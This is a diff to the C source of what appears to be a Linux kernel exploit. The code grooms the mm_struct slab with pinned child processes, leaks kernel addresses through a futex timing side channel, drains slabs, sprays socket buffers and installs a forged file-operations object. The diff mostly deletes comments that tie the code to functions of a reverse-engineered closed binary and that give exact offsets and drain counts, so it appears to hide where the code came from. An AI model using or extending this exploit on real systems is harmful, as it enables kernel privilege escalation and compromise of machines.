@@ -1,8 +1,9 @@
-/* source: FUN_00106288's grooming choreography, reused from this
- * project's own proven src/util.c:prepare_kernel_page() (see 05_mm_slab_grooming.h for
- * the exact-match evidence). Only the final content write differs: this
- * calls build_fops_install_object() instead of the old engine's
- * put_slide_bank_entry(). */
+/*
+ * Prepares and reclaims an mm_struct slab. Pins allocations with child
+ * processes, resolves a target address through the futex side channel, drains
+ * selected objects, and fills reclaimed space with socket buffers.
+ */
+
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
@@ -40,8 +41,6 @@ static void groom_dbg(const char *name, uint64_t t0, uint64_t *last) {
   *last = n;
 }
 
-/* KernelSnitch tuning (experiment): getenv + strtol clamped to [lo,hi],
- * falling back on any parse error or out-of-range value. */
 static long groom_env_long_clamped(const char *name, long fallback, long lo,
                                     long hi) {
   const char *raw = getenv(name);
@@ -86,7 +85,7 @@ static pid_t clone_child(void) {
     if (getppid() == 1) {
       _exit(0);
     }
-    /* source: FUN_00105ef0 -> FUN_00104bf0 */
+
     if (pin_reclaim_to_cpu0() != 0) {
       _exit(1);
     }
@@ -174,22 +173,6 @@ static void release_ctx_storage(struct mm_ctx *ctx) {
   memset(ctx, 0, sizeof(*ctx));
 }
 
-/* source: fcn.000044f4 (this project's src/00_orchestrator.c:app_main() equivalent),
- * raw vaddr 0x4520-0x4570 -- getrlimit/setrlimit raising RLIMIT_NOFILE
- * and RLIMIT_NPROC's soft limit to the hard limit, confirmed via raw
- * disasm with asm.varsub disabled (r2's default variable naming
- * collided misleadingly with this function's own stack canary slot --
- * double-checked because of that). Applied here (not just in 00_orchestrator.c's
- * app_main(), which is the closed binary's real call site) so every
- * test harness in this project that calls groom_and_install_fops_object
- * directly gets the same protection -- this is exactly the class of fix
- * for the "F_SETPIPE_SZ Operation not permitted" fd/pipe-page budget
- * exhaustion this project separately root-caused earlier, and this
- * function is the one that forks and holds open up to ~1279 memfds in
- * one call. Non-fatal here (unlike app_main()'s copy) so a standalone
- * test harness run as a less-privileged user still proceeds and lets
- * the real spray/reclaim logic surface its own, more specific error if
- * fd exhaustion actually becomes a problem. */
 static void raise_rlimit_to_max_best_effort(int resource) {
   struct rlimit rl;
   if (getrlimit(resource, &rl) == 0) {
@@ -198,12 +181,6 @@ static void raise_rlimit_to_max_best_effort(int resource) {
   }
 }
 
-/* source: FUN_00104bf0, called by FUN_00106288 immediately after the
- * priming sendmsg. kernelsnitch_bruteforce() deliberately clears the
- * caller's affinity, so the CPU-0 pin done by app_main is no longer in
- * effect here. The closed payload restores it before freeing the mm slabs
- * and allocating the reclaim pages; both operations must use the same
- * per-CPU page lists. */
 static int pin_reclaim_to_cpu0(void) {
   cpu_set_t set;
   CPU_ZERO(&set);
@@ -364,9 +341,7 @@ static uint64_t groom_and_install_fops_object_impl(
       goto cleanup;
     }
   }
-  /* FUN_00106288 kills all 1024 prepare children immediately after every
-   * /proc/<pid>/mem fd is open. Those fds alone pin the mm_struct objects;
-   * the later two drain waves release selected fds, not live processes. */
+
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     kill_child(prepare_ctx.childs[i]);
     prepare_ctx.childs[i] = -1;
@@ -522,9 +497,6 @@ static uint64_t groom_and_install_fops_object_impl(
   }
   groom_dbg("bruteforce-done", dbg_t0, &dbg_last); /* dual timing leak */
 
-  /* Closed FUN_00106288 derives every kernel pointer from A directly:
-   * A = candidate & ~0x7fff. The skb user-data starts at D=A-0xe80, so
-   * scratch+0x2000 lands at A+0x1180; D must not replace A in pointers. */
   uint64_t aligned_base = 0;
   size_t object_index = 0;
   if (!validate_mm_candidate(leaked, &aligned_base, &object_index)) {
@@ -610,9 +582,6 @@ static uint64_t groom_and_install_fops_object_impl(
   sched_yield();
   sched_yield();
 
-  /* FUN_00106288 splits the prepare-slab drain in two capped waves.
-   * The first 16 leaders are released before the spray/target slabs;
-   * the remaining 16 are released only after the leak fd below. */
   size_t prepare_slab_count = prepare_ctx.mm_cnt / mm_objs_per_slab;
   size_t prepare_early_drains = prepare_slab_count;
   if (prepare_early_drains > 16) {
@@ -745,8 +714,7 @@ cleanup:
     }
   }
   if (result) {
-    /* Preserve the surviving mm fds through the trigger, matching the old
-     * success path. The attempt/keeper process owns their lifetime. */
+
     release_ctx_storage(&post_ctx);
     release_ctx_storage(&pre_ctx);
     release_ctx_storage(&spray_ctx);
